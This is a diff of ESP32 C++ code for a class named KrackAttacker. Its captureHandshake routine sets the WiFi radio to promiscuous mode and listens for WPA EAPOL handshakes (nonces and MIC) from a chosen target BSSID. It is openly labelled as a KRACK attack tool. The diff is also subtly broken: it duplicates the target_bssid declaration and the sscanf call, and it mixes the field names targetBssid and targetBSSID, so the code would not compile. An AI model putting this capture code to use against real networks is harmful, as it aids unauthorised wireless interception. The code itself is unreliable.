@@ -4,12 +4,10 @@
 #include <WiFi.h>
 #include <mbedtls/aes.h>
 #include <mbedtls/md.h>
-#include <mbedtls/sha1.h>
 #include <esp_wifi.h>
 
 namespace {
 volatile bool g_eapol_captured = false;
-volatile uint32_t g_handshakeCaptured = 0;
 uint8_t g_aNonce[32], g_sNonce[32], g_mic[16];
 uint8_t g_bssid[6], g_client[6];
 
@@ -56,7 +54,7 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
   }
 
   Serial.println("\n=== KRACK Attack - Real Handshake Capture ===");
-  Serial.println("Target: " + String(config.targetBssid));
+  Serial.println("Target: " + String(config.targetBSSID));
   Serial.println("Duration: " + String(config.durationMs) + "ms");
 
   isRunning_ = true;
@@ -70,6 +68,21 @@ KrackResult KrackAttacker::captureHandshake(const KrackConfig& config) {
 
   uint8_t target_bssid[6];
   sscanf(config.targetBssid, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+         &target_bssid[0], &target_bssid[1], &target_bssid[2],
+         &target_bssid[3], &target_bssid[4], &target_bssid[5]);
+
+  g_eapol_captured = false;
+  uint32_t lastHandshakeTime = 0;
+  uint32_t handshakesFound = 0;
+
+  Serial.println("Listening for EAPOL handshakes...");
+
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&krack_promiscuous_cb);
+
+  uint8_t target_bssid[6];
+  sscanf(config.targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &target_bssid[0], &target_bssid[1], &target_bssid[2],
          &target_bssid[3], &target_bssid[4], &target_bssid[5]);
 
